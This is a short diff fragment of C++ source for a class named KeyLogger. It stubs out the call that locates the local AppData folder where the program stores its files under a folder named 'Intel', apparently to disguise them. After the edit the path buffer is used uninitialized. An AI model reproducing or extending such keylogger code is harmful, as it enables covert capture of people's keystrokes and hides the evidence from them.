@@ -12,7 +12,7 @@
 #include <comdef.h>
 #include <filesystem>
 
-#include <shlobj.h> // For SHGetFolderPath
+//#include <shlobj.h> // For SHGetFolderPath
 
 //#pragma comment(lib, "taskschd.lib")
 //#pragma comment(lib, "Ws2_32.lib")
@@ -341,7 +341,7 @@ void KeyLogger::SetDirectory()
 	s_ApplicationName = appNameWide;
 
 	WCHAR appDataPathWide[MAX_PATH];
-	HRESULT result = SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPathWide);
+	HRESULT result;// = SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPathWide);
 
 	std::wstring appDataPathWideStr = appDataPathWide;
 	appDataPathWideStr.append(L"\\Intel");
